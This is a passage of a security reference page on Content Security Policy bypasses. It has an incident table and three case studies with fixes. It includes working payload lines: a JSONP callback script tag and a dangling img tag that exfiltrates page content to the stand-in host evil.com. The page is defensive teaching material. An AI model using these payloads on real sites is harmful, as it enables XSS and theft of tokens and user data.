---
source: "common/csp-deep.md"
title: "Content Security Policy (CSP) Deep — Bypass Techniques, Nonce vs Hash, Report-uri/report-to, Strict CSP"
heading: "Real-World CVEs & Incidents"
category: "common-vuln"
language: "common"
severity: "critical"
tags: [checklist, common-vuln, cves, prevention, real-world, vibe, vulnerability, what]
chunk: 6/8
---

## Real-World CVEs & Incidents

| Vulnerability | Incident | Impact |
|---------------|----------|--------|
| **Google Search CSP Bypass** | Bug bounty 2019 | JSONP endpoint on google.com bypassed CSP for XSS |
| **Facebook CDN CSP Bypass** | Bug bounty 2020 | Whitelisted CDN used for script gadgets |
| **GitHub CSP Bypass** | Bug bounty 2021 | Dangling markup exfiltration via CSP-permitted img-src |
| **WordPress CSP XSS** | Bug bounty 2022 | jQuery script gadgets bypassed CSP nonce |
| **Twitter CSP Weakness** | Bug bounty 2021 | Wildcard domain in script-src allowed subdomain bypass |
| **Rails Action Pack CSP Bypass** | CVE-2024-54133 | Flaw in the `content_security_policy` helper allowed a CSP bypass enabling XSS |
| **Shopify CSP + JSONP** | Bug bounty 2020 | Google Analytics JSONP endpoint used to bypass CSP |

### Case Study 1: Google CSP Bypass via JSONP (2019)

Security researcher discovered that Google's CSP included `https://*.google.com` in script-src. This allowed exploitation of Google's own JSONP endpoints:

1. Google's translate API on `translate.googleapis.com` had a JSONP callback
2. The JSONP endpoint returned `callback(attacker_data)` as JavaScript
3. Attacker could execute arbitrary JS via:
   `<script src="https://translate.googleapis.com/translate_a/element.js?callback=alert">`
4. This bypassed CSP since the domain was whitelisted

**Fix:** Google removed JSONP endpoints from whitelisted domains, added `base-uri` directive.

### Case Study 2: PortSwigger — Dangling Markup with Strict CSP (2023)

PortSwigger Research demonstrated CSP bypass using DOM-based dangling markup even with strict CSP:

1. A page had `script-src 'nonce-abc'` — strict CSP
2. Attacker found an HTML injection point that CSP couldn't block (HTML injection is not script execution)
3. Used `<img src="https://evil.com/log?` to exfiltrate page content
4. CSP's img-src allowed connections to external domains
5. Result: CSRF tokens, user emails, and sensitive data leaked despite strict CSP

**Fix:** Set `img-src 'self'` and use `require-trusted-types-for 'script'`

**Source:** https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup

### Case Study 3: GitHub CSP Bypass via Uploaded File (2021)

GitHub had CSP set to `script-src 'self'`. A researcher found that:

1. GitHub allows uploading files to repositories
2. A `.js` file uploaded to a repo is served from `raw.githubusercontent.com` (same origin scope)
3. Attacker could inject `<script src="/username/repo/file.js">` which executed under CSP
4. This allowed arbitrary JavaScript execution on github.com

**Fix:** GitHub moved raw content to a separate domain with script execution disabled.

---